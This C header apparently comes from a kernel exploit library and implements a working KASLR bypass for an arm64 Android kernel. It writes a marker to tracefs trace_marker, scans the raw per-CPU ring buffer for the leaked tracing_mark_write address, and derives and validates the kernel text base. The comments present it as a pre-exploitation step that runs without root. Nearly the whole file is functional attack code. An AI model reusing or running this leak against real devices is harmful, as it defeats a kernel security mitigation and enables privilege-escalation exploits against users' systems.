/* kaslr_tracefs.h — write-free tracefs KASLR text-base leak, shared across CVEs.
 *
 * Mechanism (cves/lib/kaslr/README.md): writing to /sys/kernel/tracing/trace_marker
 * makes tracing_mark_write() store its own code address
 * (_THIS_IP_ = tracing_mark_write + a fixed page offset) into the ring buffer
 * record's print_entry.ip. A RAW read of per_cpu/cpu0/trace_pipe_raw hands the
 * page back unaltered, with that pointer still in it -- kptr_restrict only gates
 * %pK and this value never passes through a %p formatter. The pointer sits in
 * the 8 bytes immediately before the marker string, so the scan is: find the
 * marker, read back 8. Then
 *
 *     _text = leaked_ip - ip_off.
 *
 * No kernel R/W primitive, no fork/futex, no boot_id write -- just tracefs
 * reads, so it can run BEFORE any exploitation stage. shell is in gid
 * readtracefs and the raw file shares the label it already reads, so this needs
 * no root.
 *
 * IMPORTANT -- this returns _text (the kernel IMAGE base), NOT _stext.
 * On this arm64 GKI build _stext sits a fixed head/vectors gap ABOVE _text:
 *
 *     _stext = _text + 0x10000        (the 64 KiB head + vectors region)
 *
 * ip_off is tracing_mark_write's _THIS_IP_ offset from _text, so the
 * subtraction yields _text; a caller that needs _stext (e.g. to resolve a
 * symbol given as an offset-from-_stext) must add the 0x10000 gap itself.
 *
 * The core leak reads per_cpu/cpu0's raw buffer, so the CALLER must be running
 * on cpu0 when the marker is written -- lib_kaslr_leak_text() pins cpu0 first;
 * a caller that manages its own affinity (e.g. a payload already pinned before
 * its leak step) uses lib_kaslr_leak_text_at() directly. Self-contained: no
 * dependency on any consumer's globals. Returns a raw u64.
 */
#ifndef LIB_KASLR_TRACEFS_H
#define LIB_KASLR_TRACEFS_H

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>

/* The ONE device/kernel-version constant: the byte offset of
 * tracing_mark_write's _THIS_IP_ from the kernel image base (_text). Consumers
 * that carry a target header (which defines it per build) get that value; this
 * default exists only so this header compiles standalone. Only its low
 * 12 bits are checked as a sanity gate, so keep it exact per build. */
#ifndef SLIDE_TRACE_MARK_IP_OFF
#define SLIDE_TRACE_MARK_IP_OFF 0x001f0ac8ULL
#endif

#ifndef LIB_KASLR_TRACEFS_DIR
#define LIB_KASLR_TRACEFS_DIR "/sys/kernel/tracing"
#endif

/* Put tracing_on back the way it was found. Leaving ftrace enabled system-wide
 * changes kernel behaviour for every later stage on this boot. */
static inline void lib_kaslr_tracing_restore(int t, int was_off)
{
	if (t < 0)
		return;
	if (was_off) {
		lseek(t, 0, SEEK_SET);
		if (write(t, "0", 1) < 0) { /* best effort */ }
	}
	close(t);
}

/* The core leak: write <marker> to trace_marker, recover tracing_mark_write's
 * _THIS_IP_ from the raw cpu0 ring buffer, return _text = ip - <ip_off> (or 0).
 * Does NOT touch CPU affinity -- the caller guarantees it runs on cpu0. */
static inline unsigned long long
lib_kaslr_leak_text_at(const char *marker, unsigned long long ip_off)
{
	const size_t MKLEN = strlen(marker);
	char path[160];
	unsigned char page[8192];
	unsigned long long text = 0;
	int r, m, t = -1, tracing_was_off = 0;

	snprintf(path, sizeof(path), "%s/per_cpu/cpu0/trace_pipe_raw",
		 LIB_KASLR_TRACEFS_DIR);
	r = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (r < 0)
		return 0;

	/* Drain cpu0's (busy) buffer first so our fresh marker lands on top. */
	{
		int drained = 0;
		while (read(r, page, sizeof(page)) > 0 && drained++ < 8192)
			;
	}

	/* tracing_mark_write bails with -EBADF if tracing_on == 0
	 * (ring_buffer_lock_reserve yields NULL), so the marker never lands
	 * unless tracing is on. Arm it, remembering whether we had to. */
	snprintf(path, sizeof(path), "%s/tracing_on", LIB_KASLR_TRACEFS_DIR);
	t = open(path, O_RDWR | O_CLOEXEC);
	if (t >= 0) {
		char c = '0';
		if (read(t, &c, 1) == 1 && c == '0') {
			tracing_was_off = 1;
			lseek(t, 0, SEEK_SET);
			if (write(t, "1", 1) < 0) { /* best effort */ }
		}
	}

	snprintf(path, sizeof(path), "%s/trace_marker", LIB_KASLR_TRACEFS_DIR);
	m = open(path, O_WRONLY | O_CLOEXEC);
	if (m < 0) {
		close(r);
		lib_kaslr_tracing_restore(t, tracing_was_off);
		return 0;
	}
	if (write(m, marker, MKLEN) < 0) {
		close(m);
		close(r);
		lib_kaslr_tracing_restore(t, tracing_was_off);
		return 0;
	}

	for (int tries = 0; tries < 400 && !text; tries++) {
		ssize_t n = read(r, page, sizeof(page));
		if (n <= 0) {
			usleep(1000);
			continue;
		}
		for (ssize_t i = 0; i + (ssize_t)MKLEN <= n; i++) {
			if (memcmp(page + i, marker, MKLEN) != 0)
				continue;
			if (i >= 8) {
				unsigned long long ip;
				memcpy(&ip, page + i - 8, 8);
				/* a slid kernel-text pointer whose low 12 bits
				 * are the fixed page offset of _THIS_IP_. */
				if ((ip >> 40) == 0xffffffULL &&
				    (ip & 0xfffULL) == (ip_off & 0xfffULL))
					text = ip - ip_off;
			}
			break;
		}
	}

	close(m);
	close(r);
	lib_kaslr_tracing_restore(t, tracing_was_off);
	return text;
}

/* Leak the kernel IMAGE base (_text), or 0 on failure. Pins to cpu0 for the
 * duration (raw trace_pipe_raw reads are per-CPU and consuming, so the marker
 * we write must land in the buffer we read), via the raw syscall so it does not
 * depend on the including TU having unlocked cpu_set_t behind __USE_GNU. */
static inline unsigned long long lib_kaslr_leak_text(void)
{
	unsigned long mask = 1UL;               /* cpu0 only */
	syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
	return lib_kaslr_leak_text_at("LIBKASLR_TRACEFS_PROBE",
				      SLIDE_TRACE_MARK_IP_OFF);
}

/* Is `slide` a load slide at all?
 *
 * A leak can return a value of the right size that is not a base: the wrong
 * field, a stale record, a symbol mistaken for its neighbour. The loader places
 * the image at a fixed alignment inside a bounded window, so a candidate
 * outside that window or off that alignment is not a slide, whatever else it
 * may be -- and a caller that resolves symbols against it computes addresses
 * that are wrong by a constant, which fails much later and far from the cause.
 *
 * The window and the alignment belong to the target, so they are passed in. */
static inline int lib_kaslr_slide_ok(unsigned long long slide,
                                     unsigned long long slide_min,
                                     unsigned long long slide_end,
                                     unsigned long long align)
{
	if (slide < slide_min || slide >= slide_end)
		return 0;
	if (align && (slide & (align - 1)))
		return 0;
	return 1;
}

/* Turn a leaked text address into a validated slide.
 *
 * Returns the slide, or 0 when the leak produced something that cannot be one.
 * Zero is unambiguous: the window never starts at zero on a target that
 * randomises at all. */
static inline unsigned long long lib_kaslr_slide(unsigned long long text,
                                                 unsigned long long image_base,
                                                 unsigned long long slide_min,
                                                 unsigned long long slide_end,
                                                 unsigned long long align)
{
	if (!text || text < image_base)
		return 0;
	if (!lib_kaslr_slide_ok(text - image_base, slide_min, slide_end, align))
		return 0;
	return text - image_base;
}

/* Leak the text base, and reject one that cannot be a base.
 *
 * This is what a consumer wants: an address it can add symbol offsets to. A
 * leak that returns the wrong field or a stale record gives a base wrong by a
 * constant, and nothing notices until a computed address is used -- a fault or
 * a silent miss, far from the cause. Returns the text base, or 0. */
static inline unsigned long long
lib_kaslr_leak_text_checked(unsigned long long image_base,
                            unsigned long long slide_min,
                            unsigned long long slide_end,
                            unsigned long long align)
{
	unsigned long long text = lib_kaslr_leak_text();

	return lib_kaslr_slide(text, image_base, slide_min, slide_end, align) ? text : 0;
}

/* The same, with the target's own bounds. The names resolve where it is used,
 * not where it is defined, so this header stays independent of the target
 * description and of include order. */
#define LIB_KASLR_LEAK_TEXT_CHECKED() \
	lib_kaslr_leak_text_checked(KIMAGE_TEXT_BASE, KASLR_SLIDE_MIN, \
	                            KASLR_SLIDE_END, KASLR_ALIGN)

#endif /* LIB_KASLR_TRACEFS_H */
